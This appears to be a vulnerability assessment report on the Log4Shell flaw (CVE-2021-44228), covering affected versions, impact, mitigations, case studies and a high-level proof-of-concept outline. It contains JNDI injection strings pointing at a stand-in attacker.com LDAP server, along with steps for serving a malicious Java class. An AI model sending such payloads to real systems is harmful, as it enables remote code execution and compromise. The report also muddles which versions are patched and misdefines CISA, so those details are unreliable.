A feature in Log4j allows message lookup (`JNDI Lookup`), meaning if a logged string contains something like `${jndi:ldap://attacker.com/payload}`, Log4j will query the given LDAP server.

If the LDAP response contains a reference to a remote Java class, the vulnerable application will fetch and execute the code **remotely**, leading to **Remote Code Execution (RCE)**.

My research on log4j:

# Vulnerability assessment report
**CVE-2021-44228 (Log4Shell)**

Affected Product: Apache Log4j2 2.0-beta9 through 2.15.0 (From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed.)

**Affected Service:** log4j is part of Apache logging service.

**Affected Vendor:** Apache Software Foundation (ASF).

#### Technical Description About The Vulnerability:

Nature of the Vulnerability: 
	CVE-2021-44228 stems from the way Log4j 2 handles JNDI (Java Naming and Directory Interface) lookups. JNDI is a Java API used to find objects in a network, often for the purpose of looking up directories or remote services. However, Log4j 2 incorrectly allows JNDI lookups within log entries, making it possible for an attacker to inject untrusted data into logs and initiate a JNDI request to an attacker-controlled LDAP (Lightweight Directory Access Protocol) or DNS server.

Attack Vector: 
	The vulnerability is triggered when a crafted log message (e.g., an HTTP header, a form input, or a user agent) containing malicious ${jndi:ldap://maliciousserver} syntax is processed by Log4j 2. This lookup results in Log4j making an external call to the attacker’s LDAP server, which could return an arbitrary Java object that gets deserialized, allowing remote code execution (RCE).

Why It’s Dangerous:
	The issue is exacerbated by the fact that log entries can come from numerous untrusted sources such as HTTP headers, user inputs, chat messages, and form submissions, providing ample opportunities for attackers to trigger the vulnerability. Additionally, Java's inherent features like deserialization and network accessibility make this kind of attack particularly powerful and easy to exploit.

Affected Versions:
	Log4j 2 versions from 2.0-beta9 to 2.14.1 are vulnerable. Later versions (starting from 2.15.0) have patched this vulnerability.

Impact Description:
	Remote Code Execution (RCE):
	The primary impact of exploiting CVE-2021-44228 is remote code execution. This means that an attacker can execute arbitrary commands on the server where the vulnerable Log4j instance resides. Since Log4j is often used in critical infrastructure, this gives attackers high-level access to the system.

Potential Consequences:
	Full System Compromise: Once an attacker gains access, they can perform any operation within the privileges of the vulnerable application. In many cases, this can lead to a full system compromise.

	Data Theft: Attackers could gain unauthorized access to sensitive data (e.g., customer information, internal logs, API keys, etc.).

	Network Pivoting: Attackers may use compromised systems to move laterally across a network, compromising other systems and gaining further access to resources.

	Installing Malware or Ransomware: Attackers could deploy additional malicious payloads such as ransomware, crypto-miners, or backdoors.

	Denial of Service (DoS): By exploiting RCE, attackers could potentially disrupt services, leading to prolonged downtimes.

Wide Attack Surface:
	Given the popularity of Log4j, the attack surface is enormous. This vulnerability has the potential to affect not only public-facing services but also internal systems. For instance, it has been found in web servers, cloud services, enterprise databases, and even IoT devices.

Real-World Exploits:
	CVE-2021-44228 was quickly weaponized by threat actors upon discovery. Reports surfaced that state-sponsored actors, ransomware groups, and cybercriminals were using the vulnerability to exploit systems worldwide. Major services like AWS, Microsoft, and Cloudflare quickly issued advisories and mitigations due to the widespread use of the vulnerable Log4j versions.


Recommendation on how to fix/mitigate this vulnerability:
	Ways to avoid the “Log4shell” CVE is to:
    1. Educate people that are connected to the same network as you to understand the vulnerability and its risks.
    2. Make sure the Apache log4j software is updated to the latest version.
    3. Doing regular audits and making sure all software is up to date.
    4. Make sure  the system is setup properly, and according to your particular computing needs
    5. Removing the “JndiLookup” class from the classpath through.
    6. Making sure to setup firewall rules to not allow malicious traffic from people that sre looking to exploit this CVE.




Case studies:

Known case studies include – 
    1. The SANS Institute analysed a retail company that suffered data exfiltration after attackers exploited the vulnerability to gain remote access. GitHub documented their response to the vulnerability by conducting an extensive audit of their repositories, resulting in over 35,000 dependencies reviewed and multiple updates deployed within days. 
    2. AWS reported that they mitigated risks by integrating automatic detection mechanisms, ultimately preventing exploitation across numerous customer accounts
    3. CISA issued a warning about a significant increase in exploitation attempts within the first week of discovery, leading to a nationwide alert to bolster defences.

CISA – Cyber security Information Sharing Act an American federal law
SANS- stand for SysAdmin, Audit, Network, and Security it is the world's largest cyber security research and training organisation.

**Idea of a POC on the high level:**
##### Step 1: Create a malicious Java class payload
Define malicious Java class:
    - Implement a static block that executes a system command.
    - Compile the Java class to `.class` file

##### Step 2: Host the malicious payload
Start a basic HTTP server to serve the `.class` file:
    - Ensure the server is reachable over the internet

##### Step 3: Setup an LDAP server that redirects requests
Create LDAP reference server:
    - Configure it to respond with a reference to the malicious `.class` file
    - Ensure LDAP returns a Java object that loads the class from the HTTP server

##### Step 4: Inject the exploit payload
Write a malicious log string:
    `${jndi:ldap://attacker.com:1389/exploit}`
    - This tells the vulnerable Log4j app to reach out to the attacker's LDAP server

Send the payload via a request to the target:

##### Step 5: Observe Remote Code Execution (RCE)
Check:
    - Check if the Java application queries the attacker's LDAP server
    - If successful, check if the vulnerable server fetches and executes the payload from the HTTP server
    - Verify that the malicious command is executed on the target machine.

